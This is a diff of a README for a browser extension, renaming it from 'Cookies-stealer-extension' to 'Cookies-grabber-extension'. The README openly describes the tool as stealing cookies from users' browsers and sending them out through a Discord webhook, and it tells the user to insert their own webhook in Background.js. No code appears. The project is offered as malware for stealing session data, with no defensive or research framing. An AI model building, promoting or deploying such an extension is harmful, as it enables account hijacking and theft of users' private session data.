@@ -1,4 +1,4 @@
-# Cookies-stealer-extension
+# Cookies-grabber-extension
 JS extension that will steal cookies from users browser and will send it through discord webhook
 
 **Add your discord webhook in the first line of "Background.js" file. Make sure that webhook is between ""**
